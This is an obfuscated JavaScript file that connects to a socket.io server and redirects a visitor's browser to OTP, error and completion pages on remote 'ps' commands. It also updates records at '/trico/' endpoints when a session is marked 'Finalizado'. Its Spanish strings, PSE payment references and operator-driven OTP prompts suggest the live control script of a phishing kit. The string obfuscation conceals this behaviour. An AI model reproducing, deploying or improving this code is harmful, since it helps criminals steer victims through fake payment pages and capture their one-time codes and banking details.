function _0x35d4() {
  const _0x3aced1 = [
    "log",
    "1178373peJNxQ",
    "user",
    "9UnLeGg",
    "application/json",
    "href",
    "otp",
    "492452llJEXd",
    "./otp.error.html",
    "GET",
    "newOtp",
    "185622altOSt",
    "./otp.html",
    "3384790OlUnSK",
    "/trico/tricoData",
    "location",
    "112Tezoqt",
    "108tFaATh",
    "json",
    "valid",
    "1140984xolrws",
    "PUT",
    "/trico/tricofinishPse/",
    "260637fAcFvT",
    "Usuario\x20encontrado",
    "valor",
    "27490GUhubn",
    "./errorPse.html",
    "metaInfo",
  ];
  _0x35d4 = function () {
    return _0x3aced1;
  };
  return _0x35d4();
}
(function (_0x5be4d1, _0x4656e5) {
  const _0x416489 = _0x36f8,
    _0xb3f85 = _0x5be4d1();
  while (!![]) {
    try {
      const _0x531d7e =
        parseInt(_0x416489(0xb3)) / 0x1 +
        parseInt(_0x416489(0xc0)) / 0x2 +
        -parseInt(_0x416489(0xba)) / 0x3 +
        (-parseInt(_0x416489(0xca)) / 0x4) *
          (-parseInt(_0x416489(0xb6)) / 0x5) +
        (parseInt(_0x416489(0xc4)) / 0x6) * (-parseInt(_0x416489(0xc9)) / 0x7) +
        (parseInt(_0x416489(0xcd)) / 0x8) * (parseInt(_0x416489(0xbc)) / 0x9) +
        parseInt(_0x416489(0xc6)) / 0xa;
      if (_0x531d7e === _0x4656e5) break;
      else _0xb3f85["push"](_0xb3f85["shift"]());
    } catch (_0x4fff03) {
      _0xb3f85["push"](_0xb3f85["shift"]());
    }
  }
})(_0x35d4, 0x3cb34);
function _0x36f8(_0x3cc9de, _0x255190) {
  const _0x35d4f6 = _0x35d4();
  return (
    (_0x36f8 = function (_0x36f8b4, _0x2e1d0d) {
      _0x36f8b4 = _0x36f8b4 - 0xb3;
      let _0x1e9e85 = _0x35d4f6[_0x36f8b4];
      return _0x1e9e85;
    }),
    _0x36f8(_0x3cc9de, _0x255190)
  );
}
var socket = io["connect"](url);
socket["on"]("ps", function (_0xdb8bb3) {
  const _0x4329c7 = _0x36f8;
  if (
    _0xdb8bb3["valor"] == _0x4329c7(0xbb) &&
    _0xdb8bb3[_0x4329c7(0xcc)] == info[_0x4329c7(0xb8)]["cc"]
  )
    window[_0x4329c7(0xc8)][_0x4329c7(0xbe)] = "./index.error.html";
  else {
    if (
      _0xdb8bb3["valor"] == _0x4329c7(0xbf) &&
      _0xdb8bb3[_0x4329c7(0xcc)] == info[_0x4329c7(0xb8)]["cc"]
    )
      window[_0x4329c7(0xc8)][_0x4329c7(0xbe)] = _0x4329c7(0xc5);
    else {
      if (
        _0xdb8bb3[_0x4329c7(0xb5)] == _0x4329c7(0xc3) &&
        _0xdb8bb3[_0x4329c7(0xcc)] == info[_0x4329c7(0xb8)]["cc"]
      )
        window[_0x4329c7(0xc8)][_0x4329c7(0xbe)] = _0x4329c7(0xc1);
      else {
        if (
          _0xdb8bb3[_0x4329c7(0xb5)] == "finish" &&
          _0xdb8bb3[_0x4329c7(0xcc)] == info[_0x4329c7(0xb8)]["cc"]
        ) {
          async function _0x435d74() {
            const _0x405f99 = _0x4329c7,
              _0x5d43ae = await fetch(url + _0x405f99(0xc7), {
                method: _0x405f99(0xc2),
                headers: { "Content-Type": _0x405f99(0xbd) },
              }),
              _0x2ed52d = await _0x5d43ae[_0x405f99(0xcb)](),
              _0x18aca4 = [..._0x2ed52d];
            for (const _0x18a450 of _0x18aca4) {
              if (_0x18a450["id"] == info[_0x405f99(0xb8)]["cc"]) {
                console[_0x405f99(0xb9)](_0x405f99(0xb4));
                const _0x2378e5 = await fetch(
                    url + _0x405f99(0xcf) + _0x18a450["idreg"],
                    {
                      method: _0x405f99(0xce),
                      headers: { "Content-Type": _0x405f99(0xbd) },
                      body: JSON["stringify"]({ estado: "Finalizado" }),
                    }
                  ),
                  _0x5eea46 = await _0x2378e5[_0x405f99(0xcb)]();
              }
            }
            window[_0x405f99(0xc8)]["href"] = _0x405f99(0xb7);
          }
          _0x435d74();
          return;
        }
      }
    }
  }
});
